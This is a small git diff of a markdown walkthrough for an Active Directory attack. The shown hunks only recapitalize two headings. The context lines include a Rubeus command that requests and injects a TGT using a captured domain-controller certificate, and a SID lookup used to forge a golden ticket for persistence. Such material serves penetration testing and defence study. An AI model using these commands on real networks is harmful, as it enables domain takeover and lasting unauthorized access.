@@ -61,7 +61,7 @@ A regular domain user with no special privileges.
 
 ![got-dc2-cert](got-dc2-cert.jpg)
 
-## 4. use Rubeus on the windows machine to request a TGT for that account using the certificate
+## 4. Use Rubeus on the windows machine to request a TGT for that account using the certificate
 
 `.\Rubeus.exe asktgt /outfile:kirbi /dc:<DOMAINCONTROLLER> /domain:<DOMAIN_FQDN> /user:<CAPTURED_DC_COMPUTER_ACCOUNT_NAME> /ptt /certificate:<CAPTURED_BASE64_CERTIFICATE>`
 
@@ -78,7 +78,7 @@ A regular domain user with no special privileges.
 
 ![code-execution-as-administrator](code-execution-as-administrator.jpg)
 
-## 7. (Optional) create a golden ticket for persistence
+## 7. (Optional) Create a Golden Ticket for persistence
 Domain SID Lookup: `lookupsid.py <DOMAIN_FQDN>/<USERNAME>@<DC_IP>`
 
 ![domain-sid-lookup](domain-sid-lookup.jpg)
